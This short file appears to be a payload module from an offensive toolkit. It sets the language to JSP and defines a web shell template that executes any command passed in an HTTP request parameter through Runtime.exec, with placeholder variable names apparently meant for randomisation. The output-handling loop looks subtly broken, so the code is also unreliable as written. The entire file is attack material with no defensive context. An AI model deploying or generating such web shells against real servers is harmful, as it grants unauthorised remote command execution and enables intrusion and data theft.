USAGE = ''
NARGS = [0, 0]
LANG = 'jsp'
EXEC = 'PAYLOAD'


pl = '''
<%@ page import="java.io.*,java.util.*"%><% Process VAR0=Runtime.getRuntime().exec(request.getParameter("VAR1"));OutputStream VAR2=VAR0.getOutputStream();DataInputStream VAR3=new DataInputStream(VAR0.getInputStream());String VAR4;while(null!=(VAR4=VAR3.readLine())){VAR2.printLn();} %>
'''
